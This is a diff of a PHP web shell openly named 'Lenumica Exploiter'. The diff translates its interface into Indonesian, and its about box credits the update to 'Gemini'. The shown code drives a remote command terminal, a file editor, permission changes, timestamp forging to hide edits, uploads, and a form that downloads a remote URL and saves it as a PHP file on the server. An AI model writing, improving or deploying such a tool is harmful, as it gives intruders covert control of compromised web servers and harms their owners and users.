-    <div id="terminalModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Terminal</h3><div class="modal-header-actions"><button id="terminal-fullscreen-btn" class="header-btn" title="Toggle Fullscreen"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"/></svg></button><button class="modal-close" onclick="closeModal('terminalModal')">&times;</button></div></div><div id="terminal-output"></div><div id="terminal-input-container"><span id="terminal-prompt">&gt;</span><input type="text" id="terminal-input" autocomplete="off"></div><div class="resizer-se"></div></div></div>
-    <div id="detailsModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title" id="details-title">Properties</h3><button class="modal-close" onclick="closeModal('detailsModal')">&times;</button></div><div class="modal-body"><table id="details-table"><tbody></tbody></table></div></div></div>
+    <div id="editorModal" class="modal"><div class="modal-content modal-lg"><div class="modal-header"><h3 class="modal-title" id="editor-title">Editor</h3><div class="modal-header-actions"><button id="editor-font-decrease" class="header-btn" title="Kurangi ukuran font">A-</button><button id="editor-font-increase" class="header-btn" title="Tambah ukuran font">A+</button><button id="editor-fullscreen-btn" class="header-btn" title="Ganti Layar Penuh"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"/></svg></button><button class="modal-close" onclick="closeModal('editorModal')">&times;</button></div></div><form id="editor-form" style="display: contents;"><input type="hidden" id="edit-path" name="path"><div id="editor-container"><textarea id="code-editor" name="content"></textarea></div><div class="modal-actions" id="editor-actions"><button type="button" class="btn-cancel" onclick="closeModal('editorModal')">Batal</button><button type="submit" class="btn-save">Simpan</button></div></form></div></div>
+    <div id="chmodModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Ubah Izin</h3><button class="modal-close" onclick="closeModal('chmodModal')">&times;</button></div><div class="modal-body"><form id="chmod-form" class="modal-form"><p id="chmod-info" style="margin-bottom:10px; color:var(--text-secondary);"></p><input type="text" id="chmod-mode" name="mode" required><div class="modal-actions"><button type="button" class="btn-cancel" onclick="closeModal('chmodModal')">Batal</button><button type="submit" class="btn-submit">Setel</button></div></form></div></div></div>
+    <div id="renameModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Ganti Nama</h3><button class="modal-close" onclick="closeModal('renameModal')">&times;</button></div><div class="modal-body"><form id="rename-form" class="modal-form"><input type="text" id="rename-new-name" name="new_name" required><div class="modal-actions"><button type="button" class="btn-cancel" onclick="closeModal('renameModal')">Batal</button><button type="submit" class="btn-submit">Ganti Nama</button></div></form></div></div></div>
+    <div id="touchModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Ubah Timestamp</h3><button class="modal-close" onclick="closeModal('touchModal')">&times;</button></div><div class="modal-body"><form id="touch-form" class="modal-form"><p style="margin-bottom:10px; color:var(--text-secondary);">Masukkan tanggal dan waktu modifikasi baru.</p><input type="text" id="touch-datetime" name="datetime" required placeholder="YYYY-MM-DD HH:MM:SS"><div class="modal-actions"><button type="button" class="btn-cancel" onclick="closeModal('touchModal')">Batal</button><button type="submit" class="btn-submit">Setel</button></div></form></div></div></div>
+    <div id="terminalModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Terminal</h3><div class="modal-header-actions"><button id="terminal-fullscreen-btn" class="header-btn" title="Ganti Layar Penuh"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"/></svg></button><button class="modal-close" onclick="closeModal('terminalModal')">&times;</button></div></div><div id="terminal-output"></div><div id="terminal-input-container"><span id="terminal-prompt">&gt;</span><input type="text" id="terminal-input" autocomplete="off"></div><div class="resizer-se"></div></div></div>
+    <div id="detailsModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title" id="details-title">Properti</h3><button class="modal-close" onclick="closeModal('detailsModal')">&times;</button></div><div class="modal-body"><table id="details-table"><tbody></tbody></table></div></div></div>
     <div id="image-viewer" class="modal"><div class="modal-content"><img id="preview-image" src=""><button id="image-prev" class="image-nav">&lt;</button><button id="image-next" class="image-nav">&gt;</button><button class="modal-close image-nav" id="image-viewer-close">&times;</button></div></div>
-    <div id="uploadModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Upload Progress</h3><button class="modal-close" onclick="closeModal('uploadModal')">&times;</button></div><div class="modal-body"><ul id="upload-progress-list"></ul></div></div></div>
-    <div id="aboutModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">About Lenumica Exploiter</h3><button class="modal-close" onclick="closeModal('aboutModal')">&times;</button></div><div class="modal-body" style="text-align:center;"><p>This script was created and developed by <strong>PTSMC GROUP</strong>, with a total visual and functional transformation by <strong>Lennumica</strong>. This version introduces a fully AJAX-powered interface, new features, and a smoother UX for a seamless, desktop-like experience.</p><p class="version" style="font-size:12px;opacity:0.7;margin-top:20px;">Version 5.5 | @ljxinhere</p></div></div></div>
-    <div id="grepModal" class="modal"><div class="modal-content modal-lg"><div class="modal-header"><h3 class="modal-title">Grep (Find text in files)</h3><button class="modal-close" onclick="closeModal('grepModal')">&times;</button></div><div class="modal-body"><form id="grep-form" class="modal-form"><div class="form-group"><label for="grep-query">Text to find</label><input type="text" id="grep-query" required></div><div class="form-group"><label for="grep-pattern">File pattern (e.g., *.php, *.txt)</label><input type="text" id="grep-pattern" value="*"></div><div class="modal-actions"><button type="submit" class="btn-primary">Search</button></div></form><div id="grep-results"></div></div></div></div>
-    <div id="linkToFileModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Convert Link to File</h3><button class="modal-close" onclick="closeModal('linkToFileModal')">&times;</button></div><div class="modal-body"><form id="link-to-file-form" class="modal-form"><div class="form-group"><label for="link-url">URL</label><input type="url" id="link-url" name="url" required placeholder="https://example.com/page.html"></div><div class="form-group"><label for="link-filename">Save as (filename)</label><input type="text" id="link-filename" name="filename" required></div><div class="form-group"><label for="link-ext">File Type</label><select id="link-ext" name="ext"><option value="html">HTML</option><option value="txt">TXT</option><option value="php">PHP</option></select></div><div class="modal-actions"><button type="button" class="btn-cancel" onclick="closeModal('linkToFileModal')">Cancel</button><button type="submit" class="btn-submit">Save</button></div></form></div></div></div>
+    <div id="uploadModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Progres Unggahan</h3><button class="modal-close" onclick="closeModal('uploadModal')">&times;</button></div><div class="modal-body"><ul id="upload-progress-list"></ul></div></div></div>
+    <div id="aboutModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Tentang Lenumica Exploiter</h3><button class="modal-close" onclick="closeModal('aboutModal')">&times;</button></div><div class="modal-body" style="text-align:center;"><p>Skrip ini dibuat dan dikembangkan oleh <strong>GRUP PTSMC</strong>, dengan transformasi visual dan fungsional total oleh <strong>Lennumica</strong>. Versi ini memperkenalkan antarmuka yang sepenuhnya didukung AJAX, fitur-fitur baru, dan UX yang lebih lancar untuk pengalaman seperti desktop yang mulus.</p><p class="version" style="font-size:12px;opacity:0.7;margin-top:20px;">Versi 5.6 (Ditingkatkan oleh Gemini) | @ljxinhere</p></div></div></div>
+    <div id="grepModal" class="modal"><div class="modal-content modal-lg"><div class="modal-header"><h3 class="modal-title">Grep (Cari teks di file)</h3><button class="modal-close" onclick="closeModal('grepModal')">&times;</button></div><div class="modal-body"><form id="grep-form" class="modal-form"><div class="form-group"><label for="grep-query">Teks yang akan dicari</label><input type="text" id="grep-query" required></div><div class="form-group"><label for="grep-pattern">Pola file (mis., *.php, *.txt)</label><input type="text" id="grep-pattern" value="*"></div><div class="modal-actions"><button type="submit" class="btn-primary">Cari</button></div></form><div id="grep-results"></div></div></div></div>
+    <div id="linkToFileModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Ubah Tautan menjadi File</h3><button class="modal-close" onclick="closeModal('linkToFileModal')">&times;</button></div><div class="modal-body"><form id="link-to-file-form" class="modal-form"><div class="form-group"><label for="link-url">URL</label><input type="url" id="link-url" name="url" required placeholder="https://example.com/page.html"></div><div class="form-group"><label for="link-filename">Simpan sebagai (nama file)</label><input type="text" id="link-filename" name="filename" required></div><div class="form-group"><label for="link-ext">Tipe File</label><select id="link-ext" name="ext"><option value="html">HTML</option><option value="txt">TXT</option><option value="php">PHP</option></select></div><div class="modal-actions"><button type="button" class="btn-cancel" onclick="closeModal('linkToFileModal')">Batal</button><button type="submit" class="btn-submit">Simpan</button></div></form></div></div></div>
     
     <div class="toast-container" id="toast-container"><?php if(isset($_SESSION['flash_message'])) { echo "<script>document.addEventListener('DOMContentLoaded', () => showToast('{$_SESSION['flash_message']['text']}', '{$_SESSION['flash_message']['type']}'));</script>"; unset($_SESSION['flash_message']); } ?></div>
 
@@ -728,9 +735,6 @@ $server_info = [
         terminalHistoryIndex: -1,
     };
 
-    /**
-     * SVG Icons v5.0
-     */
     const ICONS = {
         'dir': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#FFCA28"><path d="M4 20q-.825 0-1.413-.588T2 18V6q0-.825.588-1.413T4 4h6l2 2h8q.825 0 1.413.588T22 8v10q0 .825-.588 1.413T20 20H4Z"/></svg>',
         'dir-up': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#FFCA28"><path d="m12 11-4 4-1.4-1.4L12 8.2l5.4 5.4-1.4 1.4-4-4Z"/></svg>',
@@ -743,9 +747,6 @@ $server_info = [
         'file': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#90A4AE"><path d="M6 2c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6H6z"/></svg>',
     };
 
-    /**
-     * Initialization on DOMContentLoaded
-     */
     document.addEventListener('DOMContentLoaded', () => {
         cacheDom();
         initTheme();
@@ -756,9 +757,6 @@ $server_info = [
         renderFiles();
     });
 
-    /**
-     * Cache frequently used DOM elements
-     */
     function cacheDom() {
         G.dom.body = document.body;
         G.dom.fileListContainer = document.getElementById('file-list-container');
@@ -769,9 +767,6 @@ $server_info = [
         G.dom.terminalPrompt = document.getElementById('terminal-prompt');
     }
 
-    /**
-     * Initialize data from PHP
-     */
     function initData() {
         G.state.files = <?= json_encode($items) ?>;
         G.state.filteredFiles = G.state.files;
@@ -779,9 +774,6 @@ $server_info = [
         sortFiles();
     }
 
-    /**
-     * Initialize Theme (Dark/Light)
-     */
     function initTheme() {
         if (localStorage.getItem('theme') === 'light') {
             G.dom.body.classList.add('light-mode');
@@ -796,9 +788,6 @@ $server_info = [
         });
     }
 
-    /**
-     * Initialize View (List/Grid)
-     */
     function initView() {
         const savedView = localStorage.getItem('view') || 'list-view';
         setView(savedView);
@@ -806,10 +795,6 @@ $server_info = [
         document.getElementById('grid-view-btn').addEventListener('click', () => setView('grid-view'));
     }
 
-    /**
-     * Set the current file display view
-     * @param {string} view - 'list-view' or 'grid-view'
-     */
     function setView(view) {
         G.state.view = view;
         G.dom.fileListContainer.className = 'file-list-container ' + view;
@@ -819,18 +804,13 @@ $server_info = [
         renderFiles();
     }
     
-    /**
-     * All event listeners
-     */
     function initEventListeners() {
-        // Search
         document.getElementById('search-box').addEventListener('input', e => {
             const query = e.target.value.toLowerCase();
             G.state.filteredFiles = G.state.files.filter(f => f.name.toLowerCase().includes(query));
             renderFiles();
         });
 
-        // Select All
         document.getElementById('select-all-checkbox').addEventListener('change', e => {
             document.querySelectorAll('.file-checkbox:not(:disabled)').forEach(cb => {
                 cb.checked = e.target.checked;
@@ -839,14 +819,12 @@ $server_info = [
             updateSelectionToolbar();
         });
         
-        // Go to path
         document.getElementById('go-to-path-form').addEventListener('submit', e => {
             e.preventDefault();
             const path = e.target.elements.path.value;
             window.location.href = '?dir=' + encodeURIComponent(path);
         });
 
-        // Responsive Sidebar
         document.getElementById('menu-toggle').addEventListener('click', () => G.dom.body.classList.toggle('sidebar-open'));
         document.addEventListener('click', (e) => {
              if (G.dom.body.classList.contains('sidebar-open') && !e.target.closest('.sidebar') && !e.target.closest('#menu-toggle')) {
@@ -854,18 +832,15 @@ $server_info = [
              }
         });
 
-        // New File/Folder
         document.getElementById('new-file-form').addEventListener('submit', e => { e.preventDefault(); performSimpleAction('new_file', { name: e.target.elements.name.value }); });
         document.getElementById('new-folder-form').addEventListener('submit', e => { e.preventDefault(); performSimpleAction('new_folder', { name: e.target.elements.name.value }); });
 
-        // Link to File
         document.getElementById('link-to-file-form').addEventListener('submit', e => {
             e.preventDefault();
             const formData = new FormData(e.target);
             performSimpleAction('link_to_file', Object.fromEntries(formData.entries()));
         });
 
-        // Terminal
         const termInput = document.getElementById('terminal-input');
         termInput.addEventListener('keydown', handleTerminalInput);
         if (G.dom.terminalPrompt) {
@@ -881,15 +856,12 @@ $server_info = [
         });
         document.getElementById('editor-fullscreen-btn').addEventListener('click', () => document.querySelector('#editorModal .modal-content').classList.toggle('modal-fullscreen'));
 
-        // Editor
         document.getElementById('editor-form').addEventListener('submit', handleEditorSave);
         document.getElementById('editor-font-increase').addEventListener('click', () => changeEditorFontSize(1));
         document.getElementById('editor-font-decrease').addEventListener('click', () => changeEditorFontSize(-1));
 
-        // Grep
         document.getElementById('grep-form').addEventListener('submit', handleGrep);
 
-        // Selection Toolbar actions
         document.getElementById('selection-rename').addEventListener('click', () => { const item = document.querySelector('.file-item.selected'); openRenameModal(item.dataset.path, item.dataset.name); });
         document.getElementById('selection-touch').addEventListener('click', () => { const path = getSelectedPaths()[0]; openTouchModal(path); });
         document.getElementById('selection-copy').addEventListener('click', () => performMassAction('copy'));
@@ -897,27 +869,22 @@ $server_info = [
         document.getElementById('selection-paste').addEventListener('click', () => performSimpleAction('paste'));
         document.getElementById('selection-zip').addEventListener('click', () => performMassAction('zip'));
         document.getElementById('selection-chmod').addEventListener('click', () => openChmodModal(getSelectedPaths()));
-        document.getElementById('selection-delete').addEventListener('click', () => { if(confirm(`Delete ${getSelectedPaths().length} items permanently?`)) performMassAction('delete'); });
+        document.getElementById('selection-delete').addEventListener('click', () => { if(confirm(`Hapus ${getSelectedPaths().length} item secara permanen?`)) performMassAction('delete'); });
         
-        // Context Menu
         G.dom.fileListContainer.addEventListener('contextmenu', handleContextMenu);
         window.addEventListener('click', () => G.dom.contextMenu.style.display = 'none');
         initContextMenuActions();
 
-        // Drag & Drop Upload
         initUploader();
 
-        // Modals
         document.getElementById('rename-form').addEventListener('submit', handleRename);
         document.getElementById('chmod-form').addEventListener('submit', handleChmod);
         document.getElementById('touch-form').addEventListener('submit', handleTouch);
 
-        // Image Viewer
         document.getElementById('image-viewer-close').addEventListener('click', () => closeModal('image-viewer'));
         document.getElementById('image-prev').addEventListener('click', () => navigateImage(-1));
         document.getElementById('image-next').addEventListener('click', () => navigateImage(1));
         
-        // Global Keyboard Shortcuts
         document.addEventListener('keydown', e => {
             if (document.getElementById('image-viewer').style.display === 'flex') {
                 if (e.key === 'ArrowLeft') navigateImage(-1);
@@ -934,7 +901,6 @@ $server_info = [
                 closeTopModal();
             }
 
-            // NEW: F2, F3, F4 shortcuts
             const activeModal = document.querySelector('.modal[style*="display: flex"]');
             const isTyping = ['INPUT', 'TEXTAREA'].includes(document.activeElement.tagName);
             if (isTyping || (activeModal && activeModal.id !== 'image-viewer')) return;
@@ -966,23 +932,17 @@ $server_info = [
         });
     }
 
-    /**
-     * Update file/folder counts in the toolbar
-     */
     function updateItemCount() {
         const counts = G.state.files.reduce((acc, f) => {
             if (f.name === '..') return acc;
             f.is_dir ? acc.folders++ : acc.files++;
             return acc;
         }, { folders: 0, files: 0 });
-        G.dom.itemCount.innerText = `${counts.folders} Folders, ${counts.files} Files`;
+        G.dom.itemCount.innerText = `${counts.folders} Folder, ${counts.files} File`;
     }
 
-    /**
-     * Render the list of files
-     */
     function renderFiles() {
-        G.dom.fileListContainer.innerHTML = ''; // Clear existing
+        G.dom.fileListContainer.innerHTML = '';
         if (G.state.view === 'list-view') {
             renderListViewHeader();
         }
@@ -1016,7 +976,7 @@ $server_info = [
                         </div>
                     </div>
                 `;
-            } else { // List View structure
+            } else {
                 innerHTML = `
                     <input type="checkbox" class="file-checkbox" value="${escapeHTML(item.path)}" ${isBack ? 'disabled' : ''}>
                     <div class="file-icon">${icon}</div>
@@ -1070,7 +1030,7 @@ $server_info = [
         const header = document.createElement('div');
         header.className = 'file-list-header';
         header.innerHTML = `
-            <div class="header-col header-name" data-sort="name">Name</div>
+            <div class="header-col header-name" data-sort="name">Nama</div>
         `;
         header.querySelectorAll('.header-col').forEach(col => {
             const sortBy = col.dataset.sort;
@@ -1117,7 +1077,7 @@ $server_info = [
             }
         } catch (error) {
             console.error('API Action failed:', error);
-            showToast('An unexpected error occurred.', 'error');
+            showToast('Terjadi kesalahan yang tidak terduga.', 'error');
         } finally {
             hideLoader();
         }
@@ -1153,7 +1113,6 @@ $server_info = [
         G.dom.selectionToolbar.classList.toggle('visible', selectedCount > 0);
         document.getElementById('select-all-checkbox').checked = selectedCount > 0 && selectedCount === document.querySelectorAll('.file-checkbox:not(:disabled)').length;
 
-        // Enable/disable buttons based on selection count
         document.getElementById('selection-rename').disabled = selectedCount !== 1;
         document.getElementById('selection-touch').disabled = selectedCount !== 1;
         document.getElementById('selection-chmod').disabled = selectedCount === 0;
@@ -1198,14 +1157,14 @@ $server_info = [
         document.getElementById('ctx-rename').addEventListener('click', () => openRenameModal(getTargetPath(), G.state.contextTarget.dataset.name));
         document.getElementById('ctx-chmod').addEventListener('click', () => openChmodModal([getTargetPath()]));
         document.getElementById('ctx-touch').addEventListener('click', () => openTouchModal(getTargetPath()));
-        document.getElementById('ctx-get-link').addEventListener('click', () => fetch(`?action=get_public_url&path=${encodeURIComponent(getTargetPath())}`).then(res => res.json()).then(data => { if (data.status === 'success') { navigator.clipboard.writeText(data.url).then(() => showToast('Direct link copied!', 'success')); } else { showToast(data.message, 'error'); } }));
+        document.getElementById('ctx-get-link').addEventListener('click', () => fetch(`?action=get_public_url&path=${encodeURIComponent(getTargetPath())}`).then(res => res.json()).then(data => { if (data.status === 'success') { navigator.clipboard.writeText(data.url).then(() => showToast('Tautan langsung disalin!', 'success')); } else { showToast(data.message, 'error'); } }));
         document.getElementById('ctx-copy').addEventListener('click', () => performMassAction('copy'));
         document.getElementById('ctx-cut').addEventListener('click', () => performMassAction('cut'));
         document.getElementById('ctx-paste').addEventListener('click', () => performSimpleAction('paste'));
         document.getElementById('ctx-duplicate').addEventListener('click', () => performSimpleAction('duplicate', { path: getTargetPath() }));
         document.getElementById('ctx-extract').addEventListener('click', () => { showLoader(); window.location.href = `?action=extract&path=${encodeURIComponent(getTargetPath())}&dir=${encodeURIComponent(G.state.currentDir)}`; });
         document.getElementById('ctx-properties').addEventListener('click', () => openDetailsModal(getTargetPath()));
-        document.getElementById('ctx-delete').addEventListener('click', () => { if(confirm(`Delete ${getSelectedPaths().length} items permanently?`)) performMassAction('delete'); });
+        document.getElementById('ctx-delete').addEventListener('click', () => { if(confirm(`Hapus ${getSelectedPaths().length} item secara permanen?`)) performMassAction('delete'); });
     }
 
     function openModal(id) { 
@@ -1229,7 +1188,7 @@ $server_info = [
             const content = await response.text();
             if (!response.ok) throw new Error(content);
             const filename = path.split(/[/\\]/).pop();
-            document.getElementById('editor-title').innerText = readOnly ? `Preview: ${filename}` : `Edit: ${filename}`;
+            document.getElementById('editor-title').innerText = readOnly ? `Pratinjau: ${filename}` : `Edit: ${filename}`;
             document.getElementById('editor-actions').style.display = readOnly ? 'none' : 'flex';
             document.getElementById('edit-path').value = path;
             if (!G.codeEditor) {
@@ -1245,7 +1204,7 @@ $server_info = [
             openModal('editorModal'); 
             setTimeout(() => G.codeEditor.refresh(), 100);
         } catch (error) {
-            showToast(`Error opening file: ${error.message}`, 'error');
+            showToast(`Error membuka file: ${error.message}`, 'error');
         } finally {
             hideLoader();
         }
@@ -1278,14 +1237,14 @@ $server_info = [
             const response = await fetch(`?action=get_details&path=${encodeURIComponent(path)}`);
             const data = await response.json();
             if (data.error) throw new Error(data.error);
-            document.getElementById('details-title').innerText = `Properties: ${data.name}`;
+            document.getElementById('details-title').innerText = `Properti: ${data.name}`;
             const tableBody = document.querySelector('#details-table tbody');
             const item = G.state.files.find(f => f.path === path);
-            let sizeRow = `<tr><td>Size</td><td>${data.size}</td></tr>`;
+            let sizeRow = `<tr><td>Ukuran</td><td>${data.size}</td></tr>`;
             if (item && item.is_dir) {
-                sizeRow = `<tr><td>Size</td><td id="details-size"><span>--</span> <button class="btn-primary" style="padding: 2px 8px; font-size: 12px;" onclick="calculateFolderSize(this, '${escapeJS(path)}')">Calculate</button></td></tr>`;
+                sizeRow = `<tr><td>Ukuran</td><td id="details-size"><span>--</span> <button class="btn-primary" style="padding: 2px 8px; font-size: 12px;" onclick="calculateFolderSize(this, '${escapeJS(path)}')">Hitung</button></td></tr>`;
             }
-            tableBody.innerHTML = `<tr><td>Path</td><td>${data.path}</td></tr>${sizeRow}<tr><td>Permissions</td><td>${data.perms}</td></tr><tr><td>Owner/Group</td><td>${data.owner} / ${data.group}</td></tr><tr><td>Modified</td><td>${data.modified}</td></tr>`;
+            tableBody.innerHTML = `<tr><td>Path</td><td>${data.path}</td></tr>${sizeRow}<tr><td>Izin</td><td>${data.perms}</td></tr><tr><td>Pemilik/Grup</td><td>${data.owner} / ${data.group}</td></tr><tr><td>Diubah</td><td>${data.modified}</td></tr>`;
             openModal('detailsModal');
         } catch (error) {
             showToast(error.message, 'error');
@@ -1297,7 +1256,7 @@ $server_info = [
     async function calculateFolderSize(btn, path) {
         btn.disabled = true;
         const sizeCell = document.getElementById('details-size');
-        sizeCell.innerHTML = 'Calculating...';
+        sizeCell.innerHTML = 'Menghitung...';
         try {
             const response = await fetch(`?action=get_folder_size&path=${encodeURIComponent(path)}`);
             const data = await response.json();
@@ -1321,10 +1280,10 @@ $server_info = [
         if (paths.length === 1) {
             const item = document.querySelector(`.file-item[data-path="${escapeCSS(paths[0])}"]`);
             document.getElementById('chmod-mode').value = item.dataset.perms;
-            infoEl.innerText = `Enter new permissions for ${item.dataset.name}`;
+            infoEl.innerText = `Masukkan izin baru untuk ${item.dataset.name}`;
         } else {
             document.getElementById('chmod-mode').value = '0644';
-            infoEl.innerText = `Enter new permissions for ${paths.length} items.`;
+            infoEl.innerText = `Masukkan izin baru untuk ${paths.length} item.`;
         }
         openModal('chmodModal');
         setTimeout(() => document.getElementById('chmod-mode').focus(), 50);
@@ -1365,17 +1324,17 @@ $server_info = [
         const query = document.getElementById('grep-query').value;
         const pattern = document.getElementById('grep-pattern').value;
         const resultsContainer = document.getElementById('grep-results');
-        resultsContainer.innerHTML = 'Searching...';
+        resultsContainer.innerHTML = 'Mencari...';
         try {
             const res = await fetch(`?action=grep&query=${encodeURIComponent(query)}&pattern=${encodeURIComponent(pattern)}&dir=${encodeURIComponent(G.state.currentDir)}`);
             const data = await res.json();
             if (data.results && data.results.length > 0) {
                 resultsContainer.innerHTML = data.results.map(r => `<div><a href="#" onclick="event.preventDefault(); openEditor('${escapeJS(r.path)}')">${escapeHTML(r.filename)}</a></div>`).join('');
             } else {
-                resultsContainer.innerHTML = 'No results found.';
+                resultsContainer.innerHTML = 'Tidak ada hasil yang ditemukan.';
             }
         } catch(e) {
-            resultsContainer.innerHTML = 'An error occurred.';
+            resultsContainer.innerHTML = 'Terjadi kesalahan.';
         } finally {
             hideLoader();
         }
@@ -1386,7 +1345,7 @@ $server_info = [
             const cmd = e.target.value;
             const termOutput = document.getElementById('terminal-output');
             const promptHTML = `<span style="color: #fff;">${G.dom.terminalPrompt.innerText}${escapeHTML(cmd)}</span>\n`;
-            const loaderHTML = `<div class="terminal-loader-container"><span class="terminal-loader"></span>Executing...</div>`;
+            const loaderHTML = `<div class="terminal-loader-container"><span class="terminal-loader"></span>Menjalankan...</div>`;
             termOutput.innerHTML += promptHTML + loaderHTML;
             termOutput.scrollTop = termOutput.scrollHeight;
             e.target.value = '';
@@ -1418,9 +1377,6 @@ $server_info = [
         }
     }
 
-    /**
-     * Draggable and Resizable Terminal Logic
-     */
     function initDraggableResizableTerminal() {
         const terminal = document.querySelector('#terminalModal .modal-content');
         const header = terminal.querySelector('.modal-header');
@@ -1503,7 +1459,7 @@ $server_info = [
         Array.from(files).forEach((file, index) => {
             const item = document.createElement('li');
             item.className = 'upload-progress-item';
-            item.innerHTML = `<p>${escapeHTML(file.name)}</p><div class="progress-bg"><div class="progress-fill" id="progress-${index}"></div></div><span class="upload-status" id="status-${index}">Waiting...</span>`;
+            item.innerHTML = `<p>${escapeHTML(file.name)}</p><div class="progress-bg"><div class="progress-fill" id="progress-${index}"></div></div><span class="upload-status" id="status-${index}">Menunggu...</span>`;
             uploadList.appendChild(item);
             const formData = new FormData();
             formData.append('action', 'upload');
@@ -1523,7 +1479,7 @@ $server_info = [
                 if (xhr.status === 200) {
                     const result = JSON.parse(xhr.responseText);
                     if (result.status === 'success') {
-                        statusEl.innerText = 'Success!';
+                        statusEl.innerText = 'Sukses!';
                         statusEl.style.color = 'var(--success-color)';
                         if (index === files.length - 1) setTimeout(() => window.location.reload(), 1000);
                     } else {
@@ -1531,22 +1487,19 @@ $server_info = [
                         statusEl.className = 'upload-status error';
                     }
                 } else {
-                    statusEl.innerText = `Error: Server responded with status ${xhr.status}`;
+                    statusEl.innerText = `Error: Server merespons dengan status ${xhr.status}`;
                     statusEl.className = 'upload-status error';
                 }
             };
             xhr.onerror = () => {
                 const statusEl = document.getElementById(`status-${index}`);
-                statusEl.innerText = 'Upload failed due to a network error.';
+                statusEl.innerText = 'Unggahan gagal karena kesalahan jaringan.';
                 statusEl.className = 'upload-status error';
             };
             xhr.send(formData);
         });
     }
 
-    /**
-     * Utility Functions
-     */
     function showLoader() { document.getElementById('loading-overlay').style.display = 'flex'; }
     function hideLoader() { document.getElementById('loading-overlay').style.display = 'none'; }
     function showToast(text, type = 'success') { const container = document.getElementById('toast-container'); const toast = document.createElement('div'); toast.className = `message ${type}`; toast.innerHTML = `<p>${text}</p>`; toast.style.display = 'flex'; container.appendChild(toast); setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 500); }, 5000); }
